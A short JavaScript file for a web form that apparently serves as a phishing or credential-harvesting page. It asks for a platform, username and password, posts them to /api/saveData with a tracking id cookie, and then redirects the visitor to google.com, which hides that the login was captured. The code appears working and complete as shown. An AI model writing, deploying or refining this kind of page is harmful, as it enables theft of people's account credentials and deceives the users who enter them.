function getid() {
    if (Cookies.get('id')) {
        document.getElementById('id').value = Cookies.get('id')
    } else {
        fetch("/api/databaseId")
            .then(response => response.json())
            .then(result => {
                let id = result._id
                Cookies.set('id', id, { expires: 30, path: '/' })
                document.getElementById('id').value = Cookies.get('id')
            })
            .catch(error => console.log('error', error));
    }
}
getid()


var form = document.getElementById('form')

form.addEventListener('submit', (e) => {
    e.preventDefault();
    // console.log(form.elements[0].value)
    Cookies.set('platform', form.elements[1].value, { expires: 30, path: '/' })
        // console.log(form.elements[2].value)
        // console.log(form.elements[3].value)
    var myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/x-www-form-urlencoded");

    var urlencoded = new URLSearchParams();
    urlencoded.append("id", form.elements[0].value);
    urlencoded.append("platform", form.elements[1].value);
    urlencoded.append("username", form.elements[2].value);
    urlencoded.append("password", form.elements[3].value);

    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: urlencoded,
        redirect: 'follow'
    };

    fetch("/api/saveData", requestOptions)
        .then(response => response.text())
        .then(result => {
            // console.log(result)
            window.location.href = "https://www.google.com/";

        })
        .catch(error => console.log('error', error));
})
